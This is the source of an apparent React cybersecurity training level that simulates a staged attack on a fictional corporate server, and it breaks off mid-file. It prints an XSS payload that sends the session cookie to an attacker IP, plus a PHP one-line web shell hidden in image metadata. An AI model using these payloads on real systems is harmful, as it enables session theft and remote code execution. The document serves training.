import { useState, useRef, useEffect } from "react";
import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Progress } from "@/components/ui/progress";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { ScrollArea } from "@/components/ui/scroll-area";
import { 
  Terminal as TerminalIcon, 
  Globe, 
  FileCode, 
  Shield, 
  CheckCircle, 
  XCircle, 
  AlertTriangle,
  Clock,
  Target,
  Zap
} from "lucide-react";
import { toast } from "sonner";

interface TerminalHistory {
  command: string;
  output: string;
  type: "success" | "error" | "info";
}

interface BurpRequest {
  id: number;
  method: string;
  url: string;
  status: number;
  length: number;
  time: string;
}

const Level26 = () => {
  // Mission State
  const [currentPhase, setCurrentPhase] = useState(1);
  const [completedPhases, setCompletedPhases] = useState<number[]>([]);
  const [missionTime, setMissionTime] = useState(0);
  const [ipBanned, setIpBanned] = useState(false);
  const [banTimeRemaining, setBanTimeRemaining] = useState(0);

  // Terminal State
  const [terminalHistory, setTerminalHistory] = useState<TerminalHistory[]>([
    { command: "", output: "Kali Linux 2024.1 - Operator Workstation\nIP Address: 10.10.14.2\nTarget: dynamo-corp.net (accessible)\nType 'help' for available commands.\n", type: "info" }
  ]);
  const [currentCommand, setCurrentCommand] = useState("");
  const terminalRef = useRef<HTMLDivElement>(null);

  // Phase 1: Reconnaissance State
  const [discoveredPorts, setDiscoveredPorts] = useState<number[]>([]);
  const [discoveredDirectories, setDiscoveredDirectories] = useState<string[]>([]);
  const [scanSpeed, setScanSpeed] = useState("normal");

  // Phase 2: XSS & Session Hijacking State
  const [xssPayload, setXssPayload] = useState("");
  const [xssTestResults, setXssTestResults] = useState<string[]>([]);
  const [cookieListenerActive, setCookieListenerActive] = useState(false);
  const [stolenCookie, setStolenCookie] = useState("");
  const [sessionHijacked, setSessionHijacked] = useState(false);

  // Phase 3: File Upload State
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [uploadAttempts, setUploadAttempts] = useState<string[]>([]);
  const [webShellActive, setWebShellActive] = useState(false);

  // Phase 4: Privilege Escalation State
  const [currentUser, setCurrentUser] = useState("www-data");
  const [shellCommand, setShellCommand] = useState("");
  const [shellOutput, setShellOutput] = useState<string[]>([]);
  const [rootAccess, setRootAccess] = useState(false);

  // Burp Suite State
  const [burpRequests, setBurpRequests] = useState<BurpRequest[]>([]);
  const [selectedRequest, setSelectedRequest] = useState<BurpRequest | null>(null);
  const [repeaterRequest, setRepeaterRequest] = useState("");
  const [repeaterResponse, setRepeaterResponse] = useState("");

  // Mission Timer
  useEffect(() => {
    const timer = setInterval(() => {
      setMissionTime(prev => prev + 1);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Ban Timer
  useEffect(() => {
    if (ipBanned && banTimeRemaining > 0) {
      const timer = setInterval(() => {
        setBanTimeRemaining(prev => {
          if (prev <= 1) {
            setIpBanned(false);
            toast.success("IP ban lifted. You may resume operations.");
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [ipBanned, banTimeRemaining]);

  // Auto-scroll terminal
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalHistory]);

  const formatTime = (seconds: number) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const executeCommand = (cmd: string) => {
    if (ipBanned) {
      addToTerminal(cmd, "Connection timed out. Your IP has been banned by the IPS.", "error");
      return;
    }

    const parts = cmd.trim().toLowerCase().split(' ');
    const baseCmd = parts[0];

    switch (baseCmd) {
      case 'help':
        addToTerminal(cmd, `Available commands:
  nmap - Network scanning
  gobuster - Directory enumeration
  nc - Netcat listener
  curl - Make HTTP requests
  ifconfig - Show network configuration
  exiftool - Examine/modify file metadata
  clear - Clear terminal`, "info");
        break;

      case 'ifconfig':
        addToTerminal(cmd, `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.14.2  netmask 255.255.255.0  broadcast 10.10.14.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)`, "success");
        break;

      case 'nmap':
        handleNmapScan(cmd, parts);
        break;

      case 'gobuster':
        handleGobuster(cmd, parts);
        break;

      case 'nc':
        handleNetcat(cmd, parts);
        break;

      case 'curl':
        handleCurl(cmd, parts);
        break;

      case 'exiftool':
        handleExiftool(cmd, parts);
        break;

      case 'clear':
        setTerminalHistory([]);
        break;

      default:
        addToTerminal(cmd, `bash: ${baseCmd}: command not found`, "error");
    }
  };

  const handleNmapScan = (cmd: string, parts: string[]) => {
    // Check for aggressive scan flags
    if (cmd.includes('-t4') || cmd.includes('-t5') || cmd.includes('--max-rate')) {
      triggerIPBan();
      return;
    }

    if (!parts.includes('dynamo-corp.net')) {
      addToTerminal(cmd, "Error: Please specify target (dynamo-corp.net)", "error");
      return;
    }

    addToTerminal(cmd, "Starting Nmap scan...\n", "info");
    
    setTimeout(() => {
      const output = `Nmap scan report for dynamo-corp.net (192.168.10.50)
Host is up (0.021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache/2.4.41 (Ubuntu)

Service detection performed. Scan complete.`;
      
      addToTerminal("", output, "success");
      setDiscoveredPorts([22, 80]);
      
      if (!completedPhases.includes(1)) {
        toast.success("Ports discovered! Next: enumerate web directories");
      }
    }, 2000);
  };

  const handleGobuster = (cmd: string, parts: string[]) => {
    if (!parts.includes('dynamo-corp.net') && !parts.includes('http://dynamo-corp.net')) {
      addToTerminal(cmd, "Error: Please specify target URL", "error");
      return;
    }

    // Check for aggressive thread count
    const threadIndex = parts.indexOf('-t');
    if (threadIndex !== -1 && parseInt(parts[threadIndex + 1]) > 20) {
      triggerIPBan();
      return;
    }

    if (!parts.includes('-w') && !parts.includes('--wordlist')) {
      addToTerminal(cmd, "Error: Please specify wordlist with -w flag", "error");
      return;
    }

    addToTerminal(cmd, "Starting directory enumeration...\n", "info");

    setTimeout(() => {
      const output = `===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dynamo-corp.net
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Status codes:            200,204,301,302,307,401,403
===============================================================
/blog                 (Status: 200) [Size: 4523]
/admin-panel          (Status: 403) [Size: 278]
/uploads              (Status: 301) -> /uploads/
===============================================================`;
      
      addToTerminal("", output, "success");
      setDiscoveredDirectories(['/blog', '/admin-panel', '/uploads']);
      
      if (discoveredPorts.length > 0 && !completedPhases.includes(1)) {
        setCompletedPhases(prev => [...prev, 1]);
        setCurrentPhase(2);
        toast.success("Phase 1 Complete! Proceed to XSS exploitation in /blog");
      }
    }, 3000);
  };

  const handleNetcat = (cmd: string, parts: string[]) => {
    if (parts.includes('-lvp') || (parts.includes('-l') && parts.includes('-v') && parts.includes('-p'))) {
      const portIndex = parts.findIndex(p => p === '-p') + 1 || parts.findIndex(p => /^\d+$/.test(p));
      const port = parts[portIndex];
      
      setCookieListenerActive(true);
      addToTerminal(cmd, `Listening on 0.0.0.0:${port || '9001'}
Waiting for connections...`, "info");
      toast.success("Cookie listener active. Deploy XSS payload now.");
    } else {
      addToTerminal(cmd, "Usage: nc -lvp [port]", "error");
    }
  };

  const handleCurl = (cmd: string, parts: string[]) => {
    addToTerminal(cmd, "HTTP request sent. Check Burp Suite HTTP History.", "info");
    
    // Add request to Burp
    const newRequest: BurpRequest = {
      id: burpRequests.length + 1,
      method: "GET",
      url: parts[1] || "http://dynamo-corp.net",
      status: 200,
      length: 1024,
      time: new Date().toLocaleTimeString()
    };
    setBurpRequests(prev => [...prev, newRequest]);
  };

  const handleExiftool = (cmd: string, parts: string[]) => {
    if (parts.includes('-comment') || parts.includes('-comment=')) {
      const fileName = parts[parts.length - 1];
      addToTerminal(cmd, `Writing metadata to ${fileName}
    1 image files updated
    
Polyglot file created! The JPEG contains valid PHP code in its metadata.`, "success");
      toast.success("Polyglot payload created!");
    } else {
      addToTerminal(cmd, `Usage: exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg`, "info");
    }
  };

  const triggerIPBan = () => {
    setIpBanned(true);
    setBanTimeRemaining(300); // 5 minutes
    addToTerminal("", "⚠️  INTRUSION PREVENTION SYSTEM ALERT ⚠️\nAggressive scanning detected from 10.10.14.2\nIP address has been blocked for 5 minutes.", "error");
    toast.error("IPS triggered! IP banned for 5 minutes. Use stealthier techniques.");
  };

  const addToTerminal = (cmd: string, output: string, type: "success" | "error" | "info") => {
    setTerminalHistory(prev => [...prev, { command: cmd, output, type }]);
  };

  const testXSSPayload = () => {
    // XSS validation logic
    const payload = xssPayload.toLowerCase();
    
    if (payload.includes('<script>') && payload.includes('</script>')) {
      if (payload.includes('new image()') && payload.includes('document.cookie')) {
        // Valid cookie-stealing payload
        setXssTestResults(prev => [...prev, "✅ Stored XSS successful! Payload executed."]);
        
        if (cookieListenerActive) {
          setTimeout(() => {
            const adminCookie = "PHPSESSID=7f8a9b2c4d5e6f1a; is_admin=true; user=administrator";
            setStolenCookie(adminCookie);
            addToTerminal("", `GET /?cookie=${encodeURIComponent(adminCookie)} HTTP/1.1
Connection received from 192.168.10.50:43921`, "success");
            toast.success("Admin session cookie captured!");
            
            if (!completedPhases.includes(2)) {
              toast.info("Phase 2 progress: Now hijack the session using Burp Repeater");
            }
          }, 2000);
        } else {
          setXssTestResults(prev => [...prev, "⚠️ XSS fired but no listener detected. Start netcat first."]);
        }
      } else if (payload.includes('alert')) {
        setXssTestResults(prev => [...prev, "⚠️ Basic XSS works but doesn't steal cookies. Craft a cookie-stealing payload."]);
      } else {
        setXssTestResults(prev => [...prev, "⚠️ XSS syntax valid but payload ineffective."]);
      }
    } else {
      setXssTestResults(prev => [...prev, "❌ Payload blocked or invalid XSS syntax."]);
    }
  };

  const hijackSession = () => {
    if (!stolenCookie) {
      toast.error("No stolen cookie available. Complete XSS attack first.");
      return;
    }

    if (repeaterRequest.toLowerCase().includes('cookie:') && 
        repeaterRequest.includes(stolenCookie.split(';')[0])) {
      setRepeaterResponse(`HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Admin Panel - Dynamo Corp</title></head>
<body>
  <h1>Administrator Dashboard</h1>
  <p>Welcome, Administrator</p>
  <div class="upload-section">
    <h2>Update Profile Picture</h2>
    <form action="/admin/upload" method="POST" enctype="multipart/form-data">
      <input type="file" name="profile_pic" accept="image/*">
      <button type="submit">Upload</button>
    </form>
  </div>
</body>
</html>`);

      setSessionHijacked(true);
      
      if (!completedPhases.includes(2)) {
        setCompletedPhases(prev => [...prev, 2]);
        setCurrentPhase(3);
        toast.success("Phase 2 Complete! Admin panel access gained. Proceed to file upload bypass.");
      }
    } else {
      setRepeaterResponse(`HTTP/1.1 403 Forbidden
Content-Type: text/html

Access Denied`);
    }
  };

  const handleFileUpload = (file: File | null) => {
    if (!file) return;
    
    if (!sessionHijacked) {
      toast.error("Access denied. Hijack admin session first.");
      return;
    }

    const fileName = file.name.toLowerCase();
    const fileSize = file.size;

    // Simulate upload validation
    if (fileName.endsWith('.php')) {
      if (fileName.includes('.jpg') || fileName.includes('.png')) {
        // Polyglot detected
        setUploadAttempts(prev => [...prev, `✅ ${file.name} - Upload successful! File stored at /uploads/images/${file.name}`]);
        setWebShellActive(true);
        setCurrentUser("www-data");
        
        if (!completedPhases.includes(3)) {
          setCompletedPhases(prev => [...prev, 3]);
          setCurrentPhase(4);
          toast.success("Phase 3 Complete! Web shell uploaded. Access it to get remote code execution.");
        }
      } else {
        setUploadAttempts(prev => [...prev, `❌ ${file.name} - Blocked: PHP files not allowed`]);
      }
    } else if (fileName.match(/\.(jpg|jpeg|png|gif)$/)) {
      setUploadAttempts(prev => [...prev, `⚠️ ${file.name} - Upload successful but it's just an image`]);
    } else {
      setUploadAttempts(prev => [...prev, `❌ ${file.name} - Invalid file type`]);
    }
  };

  const executeShellCommand = (cmd: string) => {
    if (!webShellActive) {
      toast.error("No web shell access. Complete file upload phase first.");
      return;
    }

    const command = cmd.toLowerCase().trim();

    if (command === 'whoami') {
      setShellOutput(prev => [...prev, `$ ${cmd}`, currentUser]);
    } else if (command === 'id') {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `uid=33(www-data) gid=33(www-data) groups=33(www-data)`]);
    } else if (command === 'pwd') {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `/var/www/html/uploads`]);
    } else if (command.startsWith('ls')) {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `payload.php  images/  temp/`]);
    } else if (command.includes('linpeas') || command.includes('enum')) {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `[+] Checking cron jobs...
/etc/cron.hourly/backup.sh [WRITABLE by www-data]
[+] This script runs as root every hour!`]);
      toast.info("Privilege escalation vector found! Modify /etc/cron.hourly/backup.sh");
    } else if (command.includes('echo') && command.includes('/etc/cron')) {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `Cron job modified. Wait for execution...`]);
      
      setTimeout(() => {
        setCurrentUser("root");
        setRootAccess(true);
        setShellOutput(prev => [...prev, ``, `[*] Reverse shell received!
[*] Connection from 192.168.10.50
[*] Privilege: root
# whoami
root`]);
        
        if (!completedPhases.includes(4)) {
          setCompletedPhases(prev => [...prev, 4]);
          toast.success("Phase 4 Complete! Root access achieved!");
        }
      }, 3000);
    } else if (command.includes('cat') && command.includes('client_manifest.csv')) {
      if (rootAccess) {
        setShellOutput(prev => [...prev, `$ ${cmd}`, `CLIENT_ID,CLIENT_NAME,CONTRACT_VALUE,STATUS
C001,TechCorp Industries,$2.5M,ACTIVE
C002,Global Finance Ltd,$5.8M,ACTIVE
C003,SecureNet Systems,$3.2M,PENDING

FLAG: DYNAMO{CH41N3D_3XPL01T5_M4ST3R}

Mission objective complete!`]);
        
        if (!completedPhases.includes(5)) {
          setCompletedPhases(prev => [...prev, 5]);
          toast.success("🎉 MISSION COMPLETE! All phases achieved.");
        }
      } else {
        setShellOutput(prev => [...prev, `$ ${cmd}`, `cat: /home/sysadmin/client_manifest.csv: Permission denied`]);
      }
    } else {
      setShellOutput(prev => [...prev, `$ ${cmd}`, `bash: ${cmd}: command not found or permission denied`]);
    }
  };

  const phases = [
    {
      id: 1,
      title: "Reconnaissance",
      description: "Stealthy enumeration of target infrastructure",
      completed: completedPhases.includes(1)
    },
    {
      id: 2,
      title: "XSS & Session Hijacking",
      description: "Steal admin credentials via stored XSS",
      completed: completedPhases.includes(2)
    },
    {
      id: 3,
      title: "File Upload Bypass",
      description: "Create polyglot payload and upload web shell",
      completed: completedPhases.includes(3)
    },
    {
      id: 4,
      title: "Privilege Escalation",
      description: "Escalate from www-data to root access",
      completed: completedPhases.includes(4)
    },
    {
      id: 5,
      title: "Objective Complete",
      description: "Exfiltrate target document",
      completed: completedPhases.includes(5)
    }
  ];

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      
      <div 
        className="pt-20 px-4 pb-8"
        style={{
          backgroundImage: 'var(--blacksite-grid)',
          backgroundSize: '40px 40px',
        }}
      >
        <div className="container mx-auto max-w-[1800px]">
          {/* Mission Header */}
          <div className="mb-6">
            <div className="flex items-center justify-between mb-4">
              <div>
                <Badge className="mb-2" style={{ 
                  background: 'linear-gradient(135deg, #8B5CF6 0%, #6D28D9 100%)',
                  color: 'white',
                  boxShadow: 'var(--royal-glow)'
                }}>
                  BLACKSITE MISSION 26
                </Badge>
                <h1 className="text-4xl font-bold" style={{ color: '#8B5CF6' }}>
                  Operation "Glass Dragon"
                </h1>
                <p className="text-muted-foreground mt-2">
                  Full-Scope Black Box Web Penetration Test
                </p>
              </div>
              <div className="text-right">
                <div className="flex items-center gap-2 text-muted-foreground mb-2">
                  <Clock className="w-4 h-4" />
                  <span className="font-mono">{formatTime(missionTime)}</span>
                </div>
                <div className="text-sm">
                  Phase {currentPhase}/5
                </div>
              </div>
            </div>

            {/* Phase Progress */}
            <Card style={{
              background: 'rgba(10, 10, 10, 0.7)',
              border: '1px solid rgba(139, 92, 246, 0.3)',
              backdropFilter: 'blur(10px)'
            }}>
              <CardContent className="pt-6">
                <div className="flex gap-2 mb-3">
                  {phases.map((phase) => (
                    <div key={phase.id} className="flex-1">
                      <div className={`h-2 rounded-full transition-all ${
                        phase.completed 
                          ? 'bg-green-500' 
                          : phase.id === currentPhase 
                            ? 'animate-pulse' 
                            : 'bg-muted/20'
                      }`}
                      style={phase.id === currentPhase && !phase.completed ? { backgroundColor: '#8B5CF6' } : {}}
                    />
                      <div className="text-xs mt-1 text-center text-muted-foreground">{phase.title}</div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {ipBanned && (
            <Alert className="mb-6 border-red-500/50 bg-red-500/10">
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription>
                <strong>IPS BAN ACTIVE:</strong> Your IP has been blocked for aggressive scanning. 
                Time remaining: {Math.floor(banTimeRemaining / 60)}:{(banTimeRemaining % 60).toString().padStart(2, '0')}
              </AlertDescription>
            </Alert>
          )}

          <Tabs defaultValue="workstation" className="space-y-4">
            <TabsList className="grid w-full grid-cols-5 bg-muted/10">
              <TabsTrigger value="workstation">
                <TerminalIcon className="w-4 h-4 mr-2" />
                Workstation
              </TabsTrigger>
              <TabsTrigger value="dossier">
                <FileCode className="w-4 h-4 mr-2" />
                Dossier
              </TabsTrigger>
              <TabsTrigger value="browser">
                <Globe className="w-4 h-4 mr-2" />
                Browser
              </TabsTrigger>
              <TabsTrigger value="burp">
                <Zap className="w-4 h-4 mr-2" />
                Burp Suite
              </TabsTrigger>
              <TabsTrigger value="report">
                <Target className="w-4 h-4 mr-2" />
                Report
              </TabsTrigger>
            </TabsList>

            {/* Workstation Terminal */}
            <TabsContent value="workstation" className="space-y-4">
              <Card style={{
                background: 'rgba(10, 10, 10, 0.7)',
                border: '1px solid rgba(139, 92, 246, 0.3)',
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                <CardTitle className="flex items-center gap-2" style={{ color: '#8B5CF6' }}>
                  <TerminalIcon className="w-5 h-5" />
                  Kali Linux Terminal (qterminal)
                </CardTitle>
                  <CardDescription>
                    Interactive BASH shell - All standard penetration testing tools available
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <div 
                    ref={terminalRef}
                    className="terminal p-4 rounded-lg h-[500px] overflow-y-auto font-mono text-sm"
                  >
                    {terminalHistory.map((entry, idx) => (
                      <div key={idx} className="mb-2">
                        {entry.command && (
                          <div className="text-cyan-400">
                            operator@kali:~$ {entry.command}
                          </div>
                        )}
                        <pre className={`whitespace-pre-wrap ${
                          entry.type === 'error' ? 'text-red-400' : 
                          entry.type === 'success' ? 'text-green-400' : 
                          'text-gray-300'
                        }`}>{entry.output}</pre>
                      </div>
                    ))}
                  </div>
                  <div className="flex gap-2 mt-4">
                    <Input
                      value={currentCommand}
                      onChange={(e) => setCurrentCommand(e.target.value)}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') {
                          executeCommand(currentCommand);
                          setCurrentCommand('');
                        }
                      }}
                      placeholder="Enter command... (type 'help' for available commands)"
                      className="font-mono bg-black/60 border-cyan-500/30"
                    />
                    <Button 
                      onClick={() => {
                        executeCommand(currentCommand);
                        setCurrentCommand('');
                      }}
                      className="bg-cyan-500 hover:bg-cyan-600"
                    >
                      Execute
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            {/* Mission Dossier */}
            <TabsContent value="dossier" className="space-y-4">
              <Card style={{
                background: 'rgba(10, 10, 10, 0.7)',
                border: '1px solid rgba(139, 92, 246, 0.3)',
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                  <CardTitle style={{ color: '#8B5CF6' }}>Mission Briefing</CardTitle>
                  <CardDescription>Classification: TOP SECRET // OPERATOR EYES ONLY // NOFORN</CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2 text-red-400">Background</h3>
                    <p className="text-muted-foreground leading-relaxed">
                      Dynamo Corp (dynamo-corp.net) has appeared on our radar. Publicly, they are a logistics 
                      and data management firm. However, our intel suggests they are a front for a data trafficking 
                      syndicate dealing in stolen corporate and government information. Their digital footprint is 
                      small, seemingly centered on a single public-facing server. We believe this server is the 
                      gateway to their entire operation.
                    </p>
                  </div>

                  <div>
                    <h3 className="text-lg font-semibold mb-2 text-green-400">Primary Objective</h3>
                    <p className="text-muted-foreground">
                      Achieve privileged (root) access on the dynamo-corp.net server.
                    </p>
                  </div>

                  <div>
                    <h3 className="text-lg font-semibold mb-2 text-blue-400">Secondary Objective</h3>
                    <p className="text-muted-foreground">
                      Locate and exfiltrate the file <code className="bg-muted/30 px-2 py-1 rounded">client_manifest.csv</code> from 
                      the system administrator's home directory (/home/sysadmin/).
                    </p>
                  </div>

                  <div className="border-t border-[hsl(var(--blacksite-purple))]/20 pt-6">
                    <h3 className="text-lg font-semibold mb-3 text-yellow-400">Rules of Engagement</h3>
                    <ol className="list-decimal list-inside space-y-2 text-muted-foreground">
                      <li>This is a <strong>black box operation</strong>. You have been provided with nothing but the target URL. All enumeration is your responsibility.</li>
                      <li>The target is protected by an <strong>Intrusion Prevention System (IPS)</strong>. Aggressive scanning will result in a 5-minute firewall ban.</li>
                      <li>No external tools are required. All necessary utilities are provided within this simulated environment.</li>
                      <li>Success depends on your ability to chain multiple vulnerabilities to achieve the objective.</li>
                    </ol>
                  </div>

                  <div style={{
                    background: 'rgba(139, 92, 246, 0.1)',
                    border: '1px solid rgba(139, 92, 246, 0.3)',
                    padding: '1.5rem',
                    borderRadius: '0.5rem'
                  }}>
                    <h3 className="text-lg font-semibold mb-3" style={{ color: '#8B5CF6' }}>
                      Technical Deep-Dive Available
                    </h3>
                    <p className="text-sm text-muted-foreground mb-3">
                      The full technical documentation covering XSS payloads, session hijacking, file upload bypasses, 
                      and privilege escalation techniques is available in the workstation's /home/operator/dossier/ directory.
                    </p>
                    <Button variant="outline" size="sm" className="border-[hsl(var(--blacksite-purple))]/50">
                      View Technical Deep-Dive
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            {/* Browser Tab */}
            <TabsContent value="browser" className="space-y-4">
              <Card style={{
                background: 'rgba(10, 10, 10, 0.7)',
                border: '1px solid rgba(139, 92, 246, 0.3)',
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2" style={{ color: '#8B5CF6' }}>
                    <Globe className="w-5 h-5" />
                    Iceweasel Browser (dynamo-corp.net)
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {!sessionHijacked ? (
                    <div className="space-y-6">
                      <div className="bg-muted/10 p-6 rounded-lg border border-muted/20">
                        <h2 className="text-2xl font-bold mb-4">Dynamo Corp - Blog</h2>
                        <div className="space-y-4">
                          <div className="p-4 bg-muted/5 rounded">
                            <h3 className="font-semibold mb-2">Latest Post: Company Update</h3>
                            <p className="text-sm text-muted-foreground mb-3">Posted by admin | 2 days ago</p>
                            <p className="text-sm">Welcome to our new blog system. Feel free to leave comments below...</p>
                          </div>

                          <div className="border-t border-muted/20 pt-4">
                            <h4 className="font-semibold mb-3">Leave a Comment:</h4>
                            <Textarea
                              value={xssPayload}
                              onChange={(e) => setXssPayload(e.target.value)}
                              placeholder="Enter your comment here..."
                              className="mb-3 font-mono text-sm"
                              rows={4}
                            />
                            <Button onClick={testXSSPayload}>Submit Comment</Button>

                            {xssTestResults.length > 0 && (
                              <div className="mt-4 space-y-2">
                                {xssTestResults.map((result, idx) => (
                                  <Alert key={idx} className={result.includes('✅') ? 'border-green-500/50' : 'border-yellow-500/50'}>
                                    <AlertDescription>{result}</AlertDescription>
                                  </Alert>
                                ))}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>

                      <Alert className="border-cyan-500/50 bg-cyan-500/10">
                        <AlertTriangle className="h-4 w-4" />
                        <AlertDescription>
                          <strong>Objective:</strong> Craft an XSS payload that steals the admin's session cookie. 
                          Example: <code className="text-xs bg-muted/30 px-1">&lt;script&gt;new Image().src="http://10.10.14.2:9001/?"+document.cookie&lt;/script&gt;</code>
                        </AlertDescription>
                      </Alert>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <Alert className="border-green-500/50 bg-green-500/10">
                        <CheckCircle className="h-4 w-4" />
                        <AlertDescription>
                          <strong>Admin Panel Access Granted</strong> - Session successfully hijacked
                        </AlertDescription>
                      </Alert>

                      <div className="bg-muted/10 p-6 rounded-lg border border-muted/20">
                        <h2 className="text-2xl font-bold mb-4">Administrator Dashboard</h2>
                        <p className="text-sm text-muted-foreground mb-6">Welcome, Administrator</p>

                        <div className="border border-muted/30 p-6 rounded-lg">
                          <h3 className="text-lg font-semibold mb-4">Update Profile Picture</h3>
                          <Input
                            type="file"
                            onChange={(e) => handleFileUpload(e.target.files?.[0] || null)}
                            accept="image/*,.php"
                            className="mb-3"
                          />
                          <p className="text-xs text-muted-foreground mb-4">
                            Accepted formats: JPG, PNG, GIF
                          </p>

                          {uploadAttempts.length > 0 && (
                            <div className="space-y-2">
                              <h4 className="font-semibold text-sm">Upload Log:</h4>
                              {uploadAttempts.map((attempt, idx) => (
                                <div key={idx} className={`text-xs p-2 rounded ${
                                  attempt.includes('✅') ? 'bg-green-500/10 text-green-400' : 
                                  attempt.includes('❌') ? 'bg-red-500/10 text-red-400' : 
                                  'bg-yellow-500/10 text-yellow-400'
                                }`}>
                                  {attempt}
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      </div>

                      {webShellActive && (
                        <Alert className="border-green-500/50 bg-green-500/10">
                          <CheckCircle className="h-4 w-4" />
                          <AlertDescription>
                            Web shell uploaded successfully! Access it at: <code className="bg-muted/30 px-2 py-1 rounded text-xs">
                              http://dynamo-corp.net/uploads/images/payload.php?cmd=[command]
                            </code>
                          </AlertDescription>
                        </Alert>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            {/* Burp Suite Tab */}
            <TabsContent value="burp" className="space-y-4">
              <div className="grid grid-cols-3 gap-4">
                {/* HTTP History */}
                <Card className="col-span-1" style={{
                  background: 'rgba(10, 10, 10, 0.7)',
                  border: '1px solid rgba(139, 92, 246, 0.3)',
                  backdropFilter: 'blur(10px)'
                }}>
                  <CardHeader>
                    <CardTitle className="text-sm" style={{ color: '#8B5CF6' }}>HTTP History</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <ScrollArea className="h-[400px]">
                      <div className="space-y-1">
                        {burpRequests.map((req) => (
                          <Button
                            key={req.id}
                            variant="ghost"
                            size="sm"
                            className="w-full justify-start text-xs font-mono"
                            onClick={() => {
                              setSelectedRequest(req);
                              setRepeaterRequest(`${req.method} ${req.url} HTTP/1.1
Host: dynamo-corp.net
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=user_session_here`);
                            }}
                          >
                            {req.id} | {req.method} | {req.status}
                          </Button>
                        ))}
                        {burpRequests.length === 0 && (
                          <p className="text-xs text-muted-foreground p-4">
                            No requests captured. Use curl or the browser to generate traffic.
                          </p>
                        )}
                      </div>
                    </ScrollArea>
                  </CardContent>
                </Card>

                {/* Repeater */}
                <Card className="col-span-2" style={{
                  background: 'rgba(10, 10, 10, 0.7)',
                  border: '1px solid rgba(139, 92, 246, 0.3)',
                  backdropFilter: 'blur(10px)'
                }}>
                  <CardHeader>
                    <CardTitle className="text-sm flex items-center justify-between" style={{ color: '#8B5CF6' }}>
                      Repeater
                      {stolenCookie && (
                        <Badge variant="outline" className="text-xs">
                          Cookie available
                        </Badge>
                      )}
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <label className="text-xs text-muted-foreground mb-2 block">Request:</label>
                      <Textarea
                        value={repeaterRequest}
                        onChange={(e) => setRepeaterRequest(e.target.value)}
                        className="font-mono text-xs h-[150px] bg-black/60"
                        placeholder="Paste or modify HTTP request here..."
                      />
                    </div>
                    
                    {stolenCookie && (
                      <Alert className="border-green-500/50 bg-green-500/10">
                        <AlertDescription className="text-xs">
                          <strong>Stolen Cookie:</strong> <code className="text-xs">{stolenCookie}</code>
                          <br />
                          Replace the Cookie header in your request above to hijack the admin session.
                        </AlertDescription>
                      </Alert>
                    )}

                    <Button onClick={hijackSession} className="w-full">
                      Send Request
                    </Button>

                    {repeaterResponse && (
                      <div>
                        <label className="text-xs text-muted-foreground mb-2 block">Response:</label>
                        <ScrollArea className="h-[150px]">
                          <pre className="text-xs font-mono bg-black/60 p-3 rounded">
                            {repeaterResponse}
                          </pre>
                        </ScrollArea>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            </TabsContent>

            {/* Web Shell / Exploitation Tab */}
            <TabsContent value="report" className="space-y-4">
              <Card style={{
                background: 'rgba(10, 10, 10, 0.7)',
                border: '1px solid rgba(139, 92, 246, 0.3)',
                backdropFilter: 'blur(10px)'
              }}>
                <CardHeader>
                  <CardTitle style={{ color: '#8B5CF6' }}>Remote Shell Access</CardTitle>
                  <CardDescription>
                    Current User: <code className={`px-2 py-1 rounded ${rootAccess ? 'bg-red-500/20 text-red-400' : 'bg-muted/30'}`}>
                      {currentUser}
                    </code>
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  {!webShellActive ? (
                    <Alert>
